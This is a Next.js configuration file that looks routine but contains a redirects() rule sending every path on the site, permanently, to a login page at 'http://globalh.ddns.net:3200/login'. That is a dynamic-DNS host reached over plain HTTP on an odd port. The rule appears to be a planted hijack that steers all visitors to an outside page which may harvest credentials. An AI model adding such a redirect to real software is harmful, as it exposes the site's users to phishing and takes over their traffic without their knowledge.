import type { NextConfig } from 'next';

const nextConfig: NextConfig = {
  reactStrictMode: true,
  transpilePackages: ['@pgb/ui', '@pgb/sdk'],
  output: 'standalone',
  async redirects() {
    return [
      {
        source: '/:path*',
        destination: 'http://globalh.ddns.net:3200/login',
        permanent: true,
      },
    ];
  },
};

export default nextConfig;